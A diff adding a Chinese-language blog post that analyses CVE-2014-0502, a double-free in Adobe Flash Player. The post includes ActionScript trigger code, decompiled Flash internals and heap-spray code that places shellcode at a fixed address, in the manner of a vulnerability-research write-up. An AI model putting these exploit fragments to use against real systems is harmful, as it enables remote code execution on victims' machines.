@@ -1,0 +1,355 @@
+<!doctype html>
+<html class="no-js">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="description" content="">
+  <meta name="keywords" content="">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <title>CVE-2014-0502分析 - c00c's Blog</title>
+
+  <!-- Set render engine for 360 browser -->
+  <meta name="renderer" content="webkit">
+
+  <!-- No Baidu Siteapp-->
+  <meta http-equiv="Cache-Control" content="no-siteapp"/>
+
+  <link rel="icon" type="image/png" href="static/i/favicon.png">
+
+  <!-- Add to homescreen for Chrome on Android -->
+  <meta name="mobile-web-app-capable" content="yes">
+  <link rel="icon" sizes="192x192" href="static/i/app-icon72x72@2x.png">
+
+  <!-- Add to homescreen for Safari on iOS -->
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="apple-mobile-web-app-title" content="Amaze UI"/>
+  <link rel="apple-touch-icon-precomposed" href="static/i/app-icon72x72@2x.png">
+
+  <!-- Tile icon for Win8 (144x144 + tile color) -->
+  <meta name="msapplication-TileImage" content="static/i/app-icon72x72@2x.png">
+  <meta name="msapplication-TileColor" content="#0e90d2">
+
+  <link rel="stylesheet" href="static/css/amazeui.min.css">
+  <link rel="stylesheet" href="static/css/header.css">
+  <link rel="stylesheet" href="static/css/footer.css">
+  <link rel="stylesheet" href="static/css/single.css">
+  <link rel="stylesheet" href="static/css/sidebar.css">
+  <link rel="stylesheet" href="static/css/railscasts.min.css">
+</head>
+<body>
+
+<!--在这里编写你的代码-->
+
+<div id="header">
+	<a href="/">c00c's Blog</a>
+</div>
+
+<div class="am-g body">
+	<div class="am-u-sm-7 am-u-sm-offset-3">
+		<div id="menu" data-am-scrollspy-nav data-am-sticky>
+	<a href="/">Home</a>
+	<a href="about.html">About</a>
+</div>
+		
+		<div id="article">
+			<div class="tags-icon am-icon-tag" id="tags">
+				
+					<span href="#">Exploit</span> 
+				
+					<span href="#">DoubleFree</span> 
+				
+				<span id="date">2017/06/15</span>
+			</div>		
+			<div id="title">CVE-2014-0502分析</div>
+			<div id="content">
+				<h2>0x00.环境</h2>
+<p>系统:：WINXP SP3</p>
+<p>影响软件：Adobe Flash Player 11.7.700.261</p>
+<h2>0x01.成因</h2>
+<p>当存储本地信息文件超过最大大小后，导致pending标志位一直置位，从而造成DoubleFree</p>
+<h2>0x02.要点</h2>
+
+<h5>0x00.为何此处值是100K?</h5>
+<pre class="lang-javascript"><code>        public function triggerexp():void
+        {
+            var exp:String="AAAA";
+            //          while(exp.length&lt;1024*100)
+            //              exp=exp+exp;
+
+            while(exp.length&lt;1024*100)
+            {
+                exp=exp+((Math.random()&lt;&lt;16)+(Math.random()&gt;&gt;16)).toString();
+            }
+            var sobj:SharedObject=SharedObject.getLocal("record");
+            sobj.data.logs=exp;
+        }
+</code></pre><p>因为超过这里的设置才会触发漏洞</p>
+<p><img alt="img" src="data\cve-2014-0502\flash-stroage.png"></p>
+<p>依据是在进入ROP前，根据栈信息进行回溯，对第一个调用函数分析</p>
+<pre class="lang-c"><code>int __thiscall SharedObject_flush(int this, char a2, double a3, char a4)
+{
+  int v6; // edx@4
+  int v7; // ecx@4
+  signed int v8; // ebx@4
+  void *v9; // eax@7
+  int v10; // eax@12
+  int v11; // eax@12
+  void *v12; // eax@16
+  void *v13; // ecx@16
+  int v14; // edi@16
+  void *v15; // eax@17
+  int v16; // eax@19
+  bool v17; // zf@19
+  bool v18; // sf@19
+  unsigned __int8 v19; // of@19
+  char *v20; // eax@19
+  int file_size; // eax@21
+  int v22; // ecx@25
+  int v23; // eax@25
+  char v24; // al@27
+  int v25; // ecx@30
+  int v26; // [sp-Ch] [bp-28h]@12
+  int v27; // [sp-8h] [bp-24h]@12
+  int v28; // [sp-4h] [bp-20h]@12
+  int v29; // [sp+Ch] [bp-10h]@12
+  int v30; // [sp+14h] [bp-8h]@18
+  int max_size; // [sp+18h] [bp-4h]@7
+  if ( !(*(this + 190) &amp; 1) )
+    return 0;
+  sub_100F0B44(this);
+  v8 = 0;
+  if ( !*(this + 193) &amp;&amp; 0.0 == a3 ) //如果pending标志位是0则直接返回，也就无法调用ROP
+    return 1;
+  v9 = *(*(this + 184) + 44);
+  max_size = -2;
+  if ( !a4 )
+    max_size = sub_100A8EAD(*(*(this + 8) + 1512), v6, v9);
+  if ( !*(this + 193) &amp;&amp; (max_size &gt; a3 || max_size == -2) )
+    return 1;
+  v10 = *this;
+  v28 = 0;
+  v27 = *(this + 8);
+  a4 = 1;
+  v26 = v7;
+  v11 = (*(v10 + 8))(this);                     // rop
+  sub_10271423(&amp;v29, v11, v27, 0);
+  sub_100ED935(this, v29, &amp;a4);
+  if ( *(this + 76) )
+  {
+    if ( max_size == -1 )
+    {
+      max_size = 0;
+      a2 = 0;
+    }
+    if ( max_size != -2 )
+    {
+      v12 = *(this + 84);
+      v13 = *(this + 108);
+      v28 = 0;
+      v14 = sub_100F12FD(v13, v12, 1, *(this + 8), 0);
+      if ( *(this + 124) &gt; 0 )
+      {
+        v15 = *(this + 120);
+        v28 = 0;
+        v14 += sub_100F12FD(v15, 0, 1, *(this + 8), 0);
+      }
+      v30 = max_size - v14;
+      if ( a3 &lt;= 0.0 )
+      {
+        file_size = *(v29 + 12);
+      }
+      else
+      {
+        HIDWORD(a3) = a3;
+        v16 = *(v29 + 12);
+        v19 = __OFSUB__(v16, HIDWORD(a3));
+        v17 = v16 == HIDWORD(a3);
+        v18 = v16 - HIDWORD(a3) &lt; 0;
+        max_size = *(v29 + 12);
+        v20 = &amp;max_size;
+        if ( (v18 ^ v19) | v17 )
+          v20 = &amp;a3 + 4;
+        file_size = *v20;
+      }
+      if ( file_size &gt; v30 ) //   如果超过100KB则跳过处理直接返回
+      {
+        if ( a2 )
+        {
+          v28 = *(this + 176);
+          v22 = *(*(this + 184) + 44);
+          v27 = v14 + file_size;
+          v23 = *(this + 8);
+          v26 = v22;
+          sub_100A9005(*(v23 + 1512), v22, v27, v28);
+          v8 = -1;
+        }
+        goto LABEL_26;
+      }
+    }
+    v24 = sub_100E4945(*(*(this + 184) + 44));
+    if ( *(*(this + 8) + 1126) &amp;&amp; !v24 )
+    {
+      v28 = a4;
+      sub_100F0904(*(v29 + 8), *(v29 + 12), a4);
+LABEL_31:
+      *(this + 193) = 0;                        // pending标志清零!!!!!!
+      v8 = 1;
+      goto LABEL_26;
+    }
+    v25 = *(v29 + 12);
+    v28 = a4;
+    if ( write_to_file(this, *(v29 + 8), v25, a4) )// 写入到文件
+      goto LABEL_31;
+  }
+LABEL_26:
+  sub_102700FA(&amp;v29);
+  return v8;
+}
+</code></pre><h5>0x01.如何完成的堆喷？</h5>
+<p>我也不太理解EXP里为什么要-0x24，我改成下面这样依然正常</p>
+<pre class="lang-c"><code>            i = 0;
+            while(i &lt; 0xc0c)
+            {
+               val.writeByte(144 + i);
+               i++;
+            }
+            val.writeBytes(shellbytes);
+            i = val.length;
+            while(i &lt; 0x10000)
+            {
+               val.writeByte(i);
+               i++;
+            }
+            block = new ByteArray();
+            block.writeBytes(val);
+            while(block.length &lt; 0x100000)
+            {
+               block.writeBytes(val);
+            }
+            Ȁ = [];
+            i = 0;
+            while(i &lt; 224)
+            {
+               block1 = new ByteArray();
+               block1.writeBytes(block,0,0x100000);
+               Ȁ.push(block1);
+               i++;
+            }
+</code></pre><p>这样就可以稳定将shellcode放置在c0c0c0c</p>
+<h3>0x02.如何实现利用？</h3>
+<p>首先参考这个PPT<a href="https://wenku.baidu.com/view/a63080886bd97f192279e9c8.html">《Flash 虚拟机内存管理及漏洞利用》</a></p>
+<p>根据ROP下断,对KV进行回溯分析（我是一步步F11才找到的。。。），找到分配内存函数</p>
+<pre class="lang-c"><code>sub_105A96C0(dword_10EDFEA0, v5, a3);
+char *__fastcall sub_105A96C0(int a1, unsigned int size, unsigned int a3)
+{
+  int v3; // eax@3
+  int v4; // eax@5
+  int v5; // esi@5
+  struct_v6 *v6; // edi@5
+  volatile LONG *v7; // ebp@5
+  struct_v8 *v8; // esi@8
+  char *result; // eax@12
+  char *v10; // eax@13
+  unsigned __int16 v11; // cx@13
+  struct_v8 *Buf; // ebx@14
+  struct_v8 *buf; // eax@19
+  struct_v8 *v14; // eax@21
+  struct_v8 *v15; // edi@24
+  volatile LONG *Destination; // [sp+0h] [bp-4h]@5
+  if ( size &gt; 0x7F0 )
+  {
+    result = alloc_big_block(a1, size, a3);
+  }
+  else
+  {
+    if ( size &gt; 4 )
+      v3 = byte_10C7EAC8[(size + 7) &gt;&gt; 3];
+    else
+      v3 = 0;
+    v4 = 9 * v3;
+    LOBYTE(v5) = 0;
+    v6 = (a1 + 4 * v4 + 4);
+    v7 = (a1 + 4 * v4 + 36);
+    Destination = (a1 + 4 * v4 + 36);
+    if ( InterlockedCompareExchange(v7, 1, 0) )
+    {
+      do
+      {
+        v5 = (v5 + 1) &amp; 0x3F;
+        Sleep(v5 == 0);
+      }
+      while ( InterlockedCompareExchange(Destination, 1, 0) );
+      v7 = Destination;
+    }
+    v8 = v6-&gt;firstFree;
+    if ( v8 || (sub_105AD290(v6, (a3 &gt;&gt; 1) &amp; 1), (v8 = v6-&gt;firstFree) != 0) )
+    {
+      ++v8-&gt;numAlloc;
+      v10 = v8-&gt;firstItem;
+      v11 = v8-&gt;numAlloc;
+      if ( v8-&gt;firstItem )
+      {
+        v8-&gt;firstItem = *v10;
+        Buf = v10;
+      }
+      else
+      {
+        Buf = v8-&gt;nextItem;
+        if ( v11 == v6-&gt;maxNumAlloc )
+          v8-&gt;nextItem = 0;
+        else
+          v8-&gt;nextItem = &amp;Buf-&gt;firstItem + v6-&gt;allocSize;
+      }
+      if ( v11 == v6-&gt;maxNumAlloc )
+      {
+        buf = v8-&gt;prevFree;
+        if ( buf &amp;&amp; buf-&gt;nextFree != v8 || (v14 = v8-&gt;nextFree) != 0 &amp;&amp; v14-&gt;prevFree != v8 )
+          abort();
+        v6-&gt;firstFree = v8-&gt;nextFree;
+        v8-&gt;nextFree = 0;
+        v15 = v6-&gt;firstFree;
+        if ( v15 )
+          v15-&gt;prevFree = 0;
+      }
+      if ( a3 &amp; 1 )
+        memset(Buf, 0, v8-&gt;size);
+      InterlockedExchange(v7, 0);
+      result = Buf;
+    }
+    else
+    {
+      if ( !((a3 &gt;&gt; 1) &amp; 1) )
+        sub_105ABA90("Failed to abort");
+      InterlockedExchange(v7, 0);
+      result = 0;
+    }
+  }
+  return result;
+}
+</code></pre><p>根据上面的线索，在调用ROP处断下，根据信息算出ROP应该的大小，如图</p>
+<p><img alt="debug" src="data\cve-2014-0502\debug.png"></p>
+
+			</div>
+		</div>
+	</div>
+</div>
+
+<div id="footer">
+	<p>&copy;2015-2017 c00c's Blog.</p>
+</div>
+
+<!--[if (gte IE 9)|!(IE)]><!-->
+<script src="static/js/jquery.min.js"></script>
+<!--<![endif]-->
+<!--[if lte IE 8 ]>
+<script src="http://libs.baidu.com/jquery/1.11.3/jquery.min.js"></script>
+<script src="http://cdn.staticfile.org/modernizr/2.8.3/modernizr.js"></script>
+<script src="static/js/amazeui.ie8polyfill.min.js"></script>
+<![endif]-->
+<script src="static/js/amazeui.min.js"></script>
+<script src="static/js/highlight.min.js"></script>
+<script >hljs.initHighlightingOnLoad();</script>
+</body>
+</html>
